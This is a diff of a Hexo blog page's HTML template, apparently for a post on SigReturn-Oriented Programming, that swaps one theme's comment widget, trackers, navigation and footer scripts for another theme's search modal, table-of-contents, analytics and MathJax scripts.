+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
 
-      
-        
-	<div id="comment">
-		<!-- 来必力City版安装代码 -->
-		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
-		<script type="text/javascript">
-		   (function(d, s) {
-		       var j, e = d.getElementsByTagName(s)[0];
-
-		       if (typeof LivereTower === 'function') { return; }
-
-		       j = d.createElement(s);
-		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-		       j.async = true;
-
-		       e.parentNode.insertBefore(j, e);
-		   })(document, 'script');
-		</script>
-		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
-		</div>
-		<!-- City版安装代码已完成 -->
-	</div>
-
-
-
-      
-    </footer>
-    <hr class="entry-footer-hr">
+      </div>
+    
   </div>
-  
+</div>
+
+<!-- Custom -->
+
+
     
-<nav id="article-nav">
+  </main>
+
   
-    <a href="/2020/03/14/Use-SROP-with-ret2VDSO/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          Use SROP with ret2VDSO
-        
-      </div>
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
     </a>
   
-  
-    <a href="/2020/03/06/Linux下的各类程序保护机制/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Linux下的各类程序保护机制</div>
-    </a>
-  
-</nav>
 
   
-</article>
-
-<!-- Table of Contents -->
-
-  <aside id="sidebar">
-    <div id="toc" class="toc-article">
-    <strong class="toc-title">Contents</strong>
-    
-      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#What-is-SROP"><span class="nav-number">1.</span> <span class="nav-text">What is SROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Signal"><span class="nav-number">1.1.</span> <span class="nav-text">Signal</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SROP-Theory"><span class="nav-number">1.2.</span> <span class="nav-text">SROP Theory</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Example"><span class="nav-number">2.</span> <span class="nav-text">Example</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Smallest"><span class="nav-number">3.</span> <span class="nav-text">Smallest</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis"><span class="nav-number">3.1.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.2.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ciscn-2019-s-3"><span class="nav-number">4.</span> <span class="nav-text">ciscn_2019_s_3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis-1"><span class="nav-number">4.1.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-1"><span class="nav-number">4.2.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Prevention"><span class="nav-number">5.</span> <span class="nav-text">Prevention</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Gadgets-Prevention"><span class="nav-number">5.1.</span> <span class="nav-text">Gadgets Prevention</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Signal-Frame-Canaries"><span class="nav-number">5.2.</span> <span class="nav-text">Signal Frame Canaries</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Break-kernel-agnostic"><span class="nav-number">5.3.</span> <span class="nav-text">Break kernel agnostic</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#References"><span class="nav-number">6.</span> <span class="nav-text">References</span></a></li></ol>
-    
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-  </aside>
+  </div>
+</div>
+  
 
-</section>
-        
-      </div>
+  
 
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
     </div>
-    <!-- <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-    <a href="/tags" class="mobile-nav-link">Tags</a>
-  
-    <a href="/about" class="mobile-nav-link">About</a>
-  
-</nav> -->
-    <footer id="footer" class="site-footer">
-  
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
 
-  <div class="clearfix container">
-      <div class="site-info">
-	      &copy; 2020 AssassinQ All Rights Reserved.
-        
-      </div>
-      <div class="site-credit">
-        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
-      </div>
+
+    
+
+    
   </div>
 </footer>
 
-
-<!-- min height -->
-
-<script>
-    var wrapdiv = document.getElementById("wrap");
-    var contentdiv = document.getElementById("content");
-
-    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-
-
-    <!-- headerblur min height -->
-    
-      var headerblur = document.getElementById("header-blur");
-      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
-    
-    
-</script>
-    
-<div style="display: none;">
-  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-</div>
-
-<!-- mathjax config similar to math.stackexchange -->
-
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
-      processEscapes: true
-    }
-  });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-      tex2jax: {
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-      }
-    });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for(i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-
-<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
-
-
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-<script src="/js/script.js"></script>
-<script src="/js/bootstrap.js"></script>
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
 
 
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
 
-  <div style="display: none;">
-    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-  </div>
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
 
+<!-- Plugins -->
 
 
 
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  </div>
 
-  <a id="rocket" href="#top" class=""></a>
-  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Understanding SigReturn-Oriented-Programming&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+          tex2jax: {
+              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+              processEscapes: true,
+              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+          }
+      });
+
+      MathJax.Hub.Queue(function() {
+          var all = MathJax.Hub.getAllJax(), i;
+          for(i=0; i < all.length; i += 1) {
+              all[i].SourceElement().parentNode.className += ' has-jax';
+          }
+      });
+
+    </script>
+
+    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
 <script type="text/x-mathjax-config">
   MathJax.Hub.Config("");
 </script>
@@ -428,5 +874,17 @@
 </script>
 <!-- End: Injected MathJax -->
 <!-- hexo-inject:end -->
+
+  
+
+
+
+
+
+
+
+
+
+
 </body>
 </html>
